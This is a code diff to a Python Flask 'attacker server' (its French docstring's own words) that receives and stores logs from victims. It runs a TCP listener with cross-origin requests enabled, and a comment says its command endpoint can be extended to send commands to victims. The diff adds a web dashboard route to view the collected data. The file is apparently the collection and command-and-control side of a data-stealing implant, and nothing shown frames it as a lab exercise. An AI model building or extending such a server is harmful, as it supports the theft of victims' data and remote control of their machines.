@@ -2,7 +2,7 @@
 Serveur attaquant - Réception et stockage des logs
 """
 
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, render_template
 from flask_cors import CORS
 import socket
 import threading
@@ -12,7 +12,7 @@ from datetime import datetime
 import config
 from storage import LogStorage
 
-app = Flask(__name__)
+app = Flask(__name__, template_folder='templates', static_folder='static')
 CORS(app)  # Permet les requêtes cross-origin
 
 storage = LogStorage()
@@ -104,6 +104,14 @@ def receive_command():
     data = request.json
     # Cette fonctionnalité peut être étendue pour envoyer des commandes aux victimes
     return jsonify({"status": "received"}), 200
+
+
+@app.route('/')
+def dashboard():
+    """
+    Page principale du dashboard web
+    """
+    return render_template('dashboard.html')
 
 
 def tcp_server():
